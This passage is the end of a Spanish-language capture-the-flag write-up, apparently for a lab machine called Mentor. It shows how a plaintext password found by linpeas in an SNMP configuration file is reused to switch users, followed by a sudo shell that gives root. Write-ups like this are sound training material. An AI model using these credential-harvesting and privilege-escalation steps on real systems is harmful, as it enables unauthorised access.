  System information as of Wed Mar 11 01:21:28 AM UTC 2026

  System load:                      0.05615234375
  Usage of /:                       66.1% of 8.09GB
  Memory usage:                     16%
  Swap usage:                       0%
  Processes:                        259
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.228.102
  IPv6 address for eth0:            dead:beef::250:56ff:feb0:e5d4

  => There are 9 zombie processes.


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$
~~~

A primer vista se ve que se comparte el directorio de trabajo de `SVC` por lo que se podria saltar el docker pero lastimosamente el recurso montado tiene permisos de solo lectura, asi que no se puede cambiar propiedades.
### Pivoting usuario James
Depues de realizar enumeracion manual no se logro obtener algo util.
Recurriendo a la enumeracion automatizada se lanzo linpeas y se encontro un archivo de configuracion con credenciales.
~~~bash
╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 1055 Aug 25  2020 /etc/nginx/fastcgi_params                                                                                          

╔══════════╣ Analyzing SNMP Files (limit 70)
-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf                                                                                               
# rocommunity: a SNMPv1/SNMPv2c read-only access community name
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
createUser bootstrap MD5 SuperSecurePassword123__ DES
-rw------- 1 Debian-snmp Debian-snmp 1268 Mar 10 20:20 /var/lib/snmp/snmpd.conf
~~~
Se puede ver una contraseña `SuperSecurePassword123__`.
Nunca esta de mas probar todas las contraseñas con todos los usuarios para ver si alguno puede iniciar sesion y talvez tener privilegios mayores.
Probandolo con el usuario `james` esta si es correcta.
~~~bash
svc@mentor:/tmp$ su james
Password: 
james@mentor:/tmp$
~~~
### Privilegios sudo
Al volver a enumerar los permisos este usuario puede lanzar una shell.
~~~bash
james@mentor:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
~~~

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con acceso como root a la maquina, ya se puede leer la root flag sin problema.
~~~
james@mentor:~$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd 
# ls
logins.log  root.txt  scripts  snap
# cat root.txt 
<Encuentre su propia root flag>
~~~
🎉 Sistema completamente comprometido - Root obtenido



